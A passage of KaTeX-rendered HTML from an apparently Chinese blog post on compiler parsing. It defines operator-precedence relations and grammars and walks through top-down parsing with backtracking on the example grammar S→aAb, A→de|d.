mathvariant=\"normal\">形</mi><mi mathvariant=\"normal\">如</mi><mtext> </mtext><mi>P</mi><mo>→</mo><mo>…</mo><mi>a</mi><mi>b</mi><mo>…</mo><mtext> </mtext><mi mathvariant=\"normal\">或</mi><mi>P</mi><mtext> </mtext><mo>→</mo><mo>…</mo><mi>a</mi><mi>Q</mi><mi>b</mi><mo>…</mo><mtext> </mtext><mi mathvariant=\"normal\">的</mi><mi mathvariant=\"normal\">规</mi><mi mathvariant=\"normal\">则</mi></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mi>a</mi><mo>&lt;</mo><mi>b</mi><mtext> </mtext><mi mathvariant=\"normal\">当</mi><mi mathvariant=\"normal\">且</mi><mi mathvariant=\"normal\">仅</mi><mi mathvariant=\"normal\">当</mi><mtext> </mtext><mi>G</mi><mtext> </mtext><mi mathvariant=\"normal\">中</mi><mi mathvariant=\"normal\">含</mi><mi mathvariant=\"normal\">有</mi><mi mathvariant=\"normal\">形</mi><mi mathvariant=\"normal\">如</mi><mi>P</mi><mo>→</mo><mo>…</mo><mi>a</mi><mi>R</mi><mo>…</mo><mtext> </mtext><mi mathvariant=\"normal\">的</mi><mi mathvariant=\"normal\">规</mi><mi mathvariant=\"normal\">则</mi><mi mathvariant=\"normal\">，</mi><mi mathvariant=\"normal\">且</mi><mtext> </mtext><mi>R</mi><mover><mo><mo>⇒</mo></mo><mo>+</mo></mover><mi>b</mi><mo>…</mo><mtext> </mtext><mi mathvariant=\"normal\">或</mi><mtext> </mtext><mi>R</mi><mover><mo><mo>⇒</mo></mo><mo>+</mo></mover><mi>Q</mi><mi>b</mi><mo>…</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mi>a</mi><mo>&gt;</mo><mi>b</mi><mo separator=\"true\">,</mo><mi mathvariant=\"normal\">当</mi><mi mathvariant=\"normal\">且</mi><mi mathvariant=\"normal\">仅</mi><mi mathvariant=\"normal\">当</mi><mtext> </mtext><mi>G</mi><mtext> </mtext><mi mathvariant=\"normal\">中</mi><mi mathvariant=\"normal\">含</mi><mi mathvariant=\"normal\">有</mi><mi mathvariant=\"normal\">形</mi><mi mathvariant=\"normal\">如</mi><mi>P</mi><mo>→</mo><mo>…</mo><mi>R</mi><mi>b</mi><mo>…</mo><mtext> </mtext><mi mathvariant=\"normal\">的</mi><mi mathvariant=\"normal\">规</mi><mi mathvariant=\"normal\">则</mi><mi mathvariant=\"normal\">，</mi><mi mathvariant=\"normal\">且</mi><mtext> </mtext><mi>R</mi><mover><mo><mo>⇒</mo></mo><mo>+</mo></mover><mo>…</mo><mi>a</mi><mtext> </mtext><mi mathvariant=\"normal\">或</mi><mtext> </mtext><mi>R</mi><mover><mo><mo>⇒</mo></mo><mo>+</mo></mover><mo>…</mo><mi>a</mi><mi>Q</mi></mrow></mstyle></mtd></mtr></mtable><annotation encoding=\"application/x-tex\">\\begin{aligned}\n&amp;a=b\\,当且仅当\\,G\\,中含有形如\\,P\\rightarrow\\dots ab\\dots\\,或P\\,\\rightarrow\\dots aQb \\dots\\,的规则\\\\\n&amp;a&lt;b\\,当且仅当\\,G\\,中含有形如P\\rightarrow \\dots aR\\dots\\,的规则，且\\,R\\stackrel{+}{\\Rightarrow}b\\dots\\,或\\,R\\stackrel{+}{\\Rightarrow}Qb\\dots\\\\\n&amp;a&gt;b,当且仅当\\,G\\,中含有形如P\\rightarrow \\dots Rb\\dots\\,的规则，且\\,R\\stackrel{+}{\\Rightarrow}\\dots a\\,或\\,R\\stackrel{+}{\\Rightarrow}\\dots aQ\n\\end{aligned}\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:4.970402000000002em;vertical-align:-2.235201000000001em;\"></span><span class=\"mord\"><span class=\"mtable\"><span class=\"col-align-r\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:2.7352010000000004em;\"><span style=\"top:-4.970402em;\"><span class=\"pstrut\" style=\"height:3.075201em;\"></span><span class=\"mord\"></span></span><span style=\"top:-3.235201em;\"><span class=\"pstrut\" style=\"height:3.075201em;\"></span><span class=\"mord\"></span></span><span style=\"top:-1.4999999999999991em;\"><span class=\"pstrut\" style=\"height:3.075201em;\"></span><span class=\"mord\"></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:2.235201000000001em;\"><span></span></span></span></span></span><span class=\"col-align-l\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:2.7352010000000004em;\"><span style=\"top:-4.970402em;\"><span class=\"pstrut\" style=\"height:3.075201em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mord mathdefault\">a</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord mathdefault\">b</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord cjk_fallback\">当</span><span class=\"mord cjk_fallback\">且</span><span class=\"mord cjk_fallback\">仅</span><span class=\"mord cjk_fallback\">当</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathdefault\">G</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord cjk_fallback\">中</span><span class=\"mord cjk_fallback\">含</span><span class=\"mord cjk_fallback\">有</span><span class=\"mord cjk_fallback\">形</span><span class=\"mord cjk_fallback\">如</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.13889em;\">P</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">→</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"minner\">…</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathdefault\">a</span><span class=\"mord mathdefault\">b</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"minner\">…</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord cjk_fallback\">或</span><span class=\"mord mathdefault\" style=\"margin-right:0.13889em;\">P</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mrel\">→</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"minner\">…</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathdefault\">a</span><span class=\"mord mathdefault\">Q</span><span class=\"mord mathdefault\">b</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"minner\">…</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord cjk_fallback\">的</span><span class=\"mord cjk_fallback\">规</span><span class=\"mord cjk_fallback\">则</span></span></span><span style=\"top:-3.235201em;\"><span class=\"pstrut\" style=\"height:3.075201em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mord mathdefault\">a</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">&lt;</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord mathdefault\">b</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord cjk_fallback\">当</span><span class=\"mord cjk_fallback\">且</span><span class=\"mord cjk_fallback\">仅</span><span class=\"mord cjk_fallback\">当</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathdefault\">G</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord cjk_fallback\">中</span><span class=\"mord cjk_fallback\">含</span><span class=\"mord cjk_fallback\">有</span><span class=\"mord cjk_fallback\">形</span><span class=\"mord cjk_fallback\">如</span><span class=\"mord mathdefault\" style=\"margin-right:0.13889em;\">P</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">→</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"minner\">…</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathdefault\">a</span><span class=\"mord mathdefault\" style=\"margin-right:0.00773em;\">R</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"minner\">…</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord cjk_fallback\">的</span><span class=\"mord cjk_fallback\">规</span><span class=\"mord cjk_fallback\">则</span><span class=\"mord cjk_fallback\">，</span><span class=\"mord cjk_fallback\">且</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.00773em;\">R</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\"><span class=\"mop op-limits\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.075201em;\"><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span><span class=\"mop\">⇒</span></span></span><span style=\"top:-3.5668699999999998em;margin-left:0em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">+</span></span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord mathdefault\">b</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"minner\">…</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord cjk_fallback\">或</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.00773em;\">R</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\"><span class=\"mop op-limits\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.075201em;\"><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span><span class=\"mop\">⇒</span></span></span><span style=\"top:-3.5668699999999998em;margin-left:0em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">+</span></span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord mathdefault\">Q</span><span class=\"mord mathdefault\">b</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"minner\">…</span></span></span><span style=\"top:-1.4999999999999991em;\"><span class=\"pstrut\" style=\"height:3.075201em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mord mathdefault\">a</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">&gt;</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord mathdefault\">b</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord cjk_fallback\">当</span><span class=\"mord cjk_fallback\">且</span><span class=\"mord cjk_fallback\">仅</span><span class=\"mord cjk_fallback\">当</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathdefault\">G</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord cjk_fallback\">中</span><span class=\"mord cjk_fallback\">含</span><span class=\"mord cjk_fallback\">有</span><span class=\"mord cjk_fallback\">形</span><span class=\"mord cjk_fallback\">如</span><span class=\"mord mathdefault\" style=\"margin-right:0.13889em;\">P</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">→</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"minner\">…</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.00773em;\">R</span><span class=\"mord mathdefault\">b</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"minner\">…</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord cjk_fallback\">的</span><span class=\"mord cjk_fallback\">规</span><span class=\"mord cjk_fallback\">则</span><span class=\"mord cjk_fallback\">，</span><span class=\"mord cjk_fallback\">且</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.00773em;\">R</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\"><span class=\"mop op-limits\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.075201em;\"><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span><span class=\"mop\">⇒</span></span></span><span style=\"top:-3.5668699999999998em;margin-left:0em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">+</span></span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"minner\">…</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathdefault\">a</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord cjk_fallback\">或</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.00773em;\">R</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\"><span class=\"mop op-limits\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.075201em;\"><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span><span class=\"mop\">⇒</span></span></span><span style=\"top:-3.5668699999999998em;margin-left:0em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">+</span></span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"minner\">…</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathdefault\">a</span><span class=\"mord mathdefault\">Q</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:2.235201000000001em;\"><span></span></span></span></span></span></span></span></span></span></span></span></p>\n<p>需要注意的是，终结符之间的算符优先关系与终结符的<strong>出现顺序</strong>是有关的。</p>\n<h5 id=\"算符优先文法\"><a class=\"markdownIt-Anchor\" href=\"#算符优先文法\"></a> 算符优先文法</h5>\n<p>设算符文法<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>G</mi></mrow><annotation encoding=\"application/x-tex\">G</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">G</span></span></span></span>不含<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>ϵ</mi></mrow><annotation encoding=\"application/x-tex\">\\epsilon</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">ϵ</span></span></span></span>规则，若对于任意两个终结符，它们的算符优先关系唯一，那<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>G</mi></mrow><annotation encoding=\"application/x-tex\">G</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">G</span></span></span></span>就是算符优先文法。</p>\n<h3 id=\"lr分析法\"><a class=\"markdownIt-Anchor\" href=\"#lr分析法\"></a> LR分析法</h3>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"语法分析的方法\"><a class=\"markdownIt-Anchor\" href=\"#语法分析的方法\"></a> 语法分析的方法</h2>\n<h3 id=\"自上而下分析法\"><a class=\"markdownIt-Anchor\" href=\"#自上而下分析法\"></a> 自上而下分析法</h3>\n<p>基本思想：对任何输入串，试图用一切可能的方法，从文法的开始符号出发，反复使用各种产生式，寻找匹配的推导。</p>\n<p>方法：反复把产生式的左部符号替换成右部，从数根开始构造语法树。<strong>寻找一个最左推导</strong>，而本质上是一个穷举过程。</p>\n<h4 id=\"例子\"><a class=\"markdownIt-Anchor\" href=\"#例子\"></a> 例子</h4>\n<p>文法<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>G</mi><mrow><mo fence=\"true\">[</mo><mi>S</mi><mo fence=\"true\">]</mo></mrow></mrow><annotation encoding=\"application/x-tex\">G\\left[S\\right]</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathdefault\">G</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"minner\"><span class=\"mopen delimcenter\" style=\"top:0em;\">[</span><span class=\"mord mathdefault\" style=\"margin-right:0.05764em;\">S</span><span class=\"mclose delimcenter\" style=\"top:0em;\">]</span></span></span></span></span>：</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mtable rowspacing=\"0.24999999999999992em\" columnalign=\"right left\" columnspacing=\"0em\"><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mi>S</mi></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mo>→</mo><mi>a</mi><mi>A</mi><mi>b</mi></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mi>A</mi></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mo>→</mo><mi>d</mi><mi>e</mi><mi mathvariant=\"normal\">∣</mi><mi>d</mi></mrow></mstyle></mtd></mtr></mtable><annotation encoding=\"application/x-tex\">\\begin{aligned}\nS &amp;\\rightarrow aAb\t\\\\\nA &amp;\\rightarrow de|d\n\\end{aligned}\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:3.0000000000000004em;vertical-align:-1.2500000000000002em;\"></span><span class=\"mord\"><span class=\"mtable\"><span class=\"col-align-r\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.7500000000000002em;\"><span style=\"top:-3.91em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.05764em;\">S</span></span></span><span style=\"top:-2.41em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\">A</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.2500000000000002em;\"><span></span></span></span></span></span><span class=\"col-align-l\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.7500000000000002em;\"><span style=\"top:-3.91em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">→</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord mathdefault\">a</span><span class=\"mord mathdefault\">A</span><span class=\"mord mathdefault\">b</span></span></span><span style=\"top:-2.41em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">→</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord mathdefault\">d</span><span class=\"mord mathdefault\">e</span><span class=\"mord\">∣</span><span class=\"mord mathdefault\">d</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.2500000000000002em;\"><span></span></span></span></span></span></span></span></span></span></span></span></p>\n<p>对于输入串<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>W</mi><mo>=</mo><mi>a</mi><mi>d</mi><mi>b</mi></mrow><annotation encoding=\"application/x-tex\">W=adb</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.13889em;\">W</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">a</span><span class=\"mord mathdefault\">d</span><span class=\"mord mathdefault\">b</span></span></span></span>，从左到右地匹配。</p>\n<ol>\n<li>首先输入流指针指向第一个字符<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>a</mi></mrow><annotation encoding=\"application/x-tex\">a</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">a</span></span></span></span>，以开始结点<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>S</mi></mrow><annotation encoding=\"application/x-tex\">S</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.05764em;\">S</span></span></span></span>构造语法树，如下。（hexo显示mermaid还要装插件，懒得弄了）</li>\n</ol>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">graph TB</span><br><span class=\"line\">    S --- a</span><br><span class=\"line\">    S --- A</span><br><span class=\"line\">    S --- b</span><br></pre></td></tr></table></figure>\n<ol start=\"2\">\n<li>此时最左子节点是终结字符<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>a</mi></mrow><annotation encoding=\"application/x-tex\">a</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">a</span></span></span></span>，与输入流指针指向的字符相同。因此该指针指向下一个字符<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>d</mi></mrow><annotation encoding=\"application/x-tex\">d</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">d</span></span></span></span>。</li>\n<li>对于下一个结点<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>A</mi></mrow><annotation encoding=\"application/x-tex\">A</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">A</span></span></span></span>，它是一个非终结字符，它会产生两颗语法树。如图：</li>\n</ol>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">graph TB</span><br><span class=\"line\">    S --- a</span><br><span class=\"line\">    S --- A</span><br><span class=\"line\">    S --- b</span><br><span class=\"line\">    A --- d</span><br><span class=\"line\">    A --- e</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">graph TB</span><br><span class=\"line\">    S --- a</span><br><span class=\"line\">    S --- A</span><br><span class=\"line\">    S --- b</span><br><span class=\"line\">    A --- d</span><br></pre></td></tr></table></figure>\n<ol start=\"4\">\n<li>先选择第一棵语法树，<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>d</mi></mrow><annotation encoding=\"application/x-tex\">d</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">d</span></span></span></span>和<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>d</mi></mrow><annotation encoding=\"application/x-tex\">d</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">d</span></span></span></span>匹配，输入流指针再次转移到下一个字符<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>b</mi></mrow><annotation encoding=\"application/x-tex\">b</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">b</span></span></span></span>。而<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>b</mi></mrow><annotation encoding=\"application/x-tex\">b</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">b</span></span></span></span>和语法树中的字符<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>e</mi></mrow><annotation encoding=\"application/x-tex\">e</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">e</span></span></span></span>不一致，匹配失败。</li>\n<li>因为第一棵语法树失败了，因此要回溯，选择第二课语法树。输入流指针重新指向第二个字符<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>d</mi></mrow><annotation encoding=\"application/x-tex\">d</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">d</span></span></span></span>。</li>\n<li>和之前一样，指针指向的字符<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>d</mi></mrow><annotation encoding=\"application/x-tex\">d</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">d</span></span></span></span>和语法树中的<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>d</mi></mrow><annotation encoding=\"application/x-tex\">d</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">d</span></span></span></span>匹配，指针指向下一个<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>b</mi></mrow><annotation encoding=\"application/x-tex\">b</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">b</span></span></span></span>。而<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>b</mi></mrow><annotation encoding=\"application/x-tex\">b</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">b</span></span></span></span>也和语法树中的第三个子节点<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>b</mi></mrow><annotation encoding=\"application/x-tex\">b</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">b</span></span></span></span>相匹配，此时语法树的子节点也被遍历完了，匹配成功。<span class=\"katex\"><span 